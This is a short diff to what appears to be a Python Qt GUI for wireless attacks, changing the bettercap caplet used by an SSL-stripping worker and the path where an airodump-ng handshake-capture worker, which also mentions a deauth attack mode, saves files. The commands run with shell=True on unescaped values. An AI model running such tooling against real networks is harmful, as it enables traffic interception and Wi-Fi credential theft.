@@ -1204,7 +1204,7 @@ class SSLStripWorker(QtCore.QObject):
         self.stop.connect(self.stop_sslstrip)
 
     def run(self):
-        self.sslstrip_progress = subprocess.Popen(f"bettercap -iface {self.interface} -caplet hstshijack/yang_sslstrip",
+        self.sslstrip_progress = subprocess.Popen(f"bettercap -iface {self.interface} -caplet hstshijack/hstshijack.cap",
                                                   shell=True, preexec_fn=os.setsid, stdout=subprocess.DEVNULL)
         current_time = datetime.now().strftime("%H:%M:%S")
         self.progress.emit(f"[+] {current_time}: sslstrip is running in the background...\n")
@@ -1283,7 +1283,7 @@ class HandshakeSnoopWorker(QtCore.QObject):
             self.snooper_process = subprocess.Popen(
                 f'xterm -hold -T "Handshake Snooper" -geometry 120x40+0+0 -fa "Monospace" -fs 10 '
                 f'-sb -rightbar -e airodump-ng --bssid {self.target_ap_bssid} --channel {self.channel} '
-                f'--write /NS-Handshake/{self.file_name} {self.interface}',
+                f'--write /opt/NS-Handshake/{self.file_name} {self.interface}',
                 shell=True, preexec_fn=os.setsid)
             self.progress.emit("[!] Please stop the attack manually when the handshake is captured")
             self.progress.emit("[+] Aggressive mode enabled, initializing deauth attack\n")
